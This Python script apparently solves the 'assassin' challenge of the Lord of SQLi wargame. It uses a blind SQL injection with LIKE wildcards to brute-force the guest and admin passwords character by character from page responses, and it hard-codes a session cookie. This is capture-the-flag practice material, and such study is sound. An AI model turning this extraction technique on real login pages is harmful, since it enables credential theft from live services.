import requests
from bs4 import BeautifulSoup

base_url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookies = {
    "PHPSESSID": "e7soiqrbe2itte2atgvtbvvm4i"
}
query_params = {
    'pw': ''
}

def fetch_password():
    admin_pw = ''
    guest_pw = ''
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    found_char_admin = False
    # 최대 길이 설정
    max_length = 20

    for i in range(1, max_length + 1):  # 비밀번호 길이 최대 20자까지 시도
        found_char = False  # 문자가 발견되었는지 확인

        for char in characters:
            # guest 탐색
            query_params['pw'] = f"{guest_pw}{char}%"
            response = requests.get(base_url, cookies=cookies, params=query_params)
            soup = BeautifulSoup(response.text, "html.parser")
            
            if soup.find('h2', string="Hello guest"):
                guest_pw += char
                print(f"guest 비밀번호 진행 중: {guest_pw}")
                found_char = True

            # admin 탐색
            if found_char_admin:
                query_params['pw'] = f"{admin_pw}{char}%"
                response = requests.get(base_url, cookies=cookies, params=query_params)
                soup = BeautifulSoup(response.text, "html.parser")
                
            if soup.find('h2', string="Hello admin"):
                if found_char_admin == False:
                    admin_pw+=guest_pw
                    found_char_admin=True
                admin_pw += char
                print(f"admin 비밀번호 진행 중: {admin_pw}")
                found_char = True

        if not found_char:
            # 더 이상 확인할 문자가 없으면 종료
            print("모든 문자 탐색 완료.")
            return admin_pw, guest_pw

    return admin_pw, guest_pw

if __name__ == "__main__":
    admin_pw, guest_pw = fetch_password()
    print(f"최종 추출된 비밀번호:\nadmin: {admin_pw}\nguest: {guest_pw}")
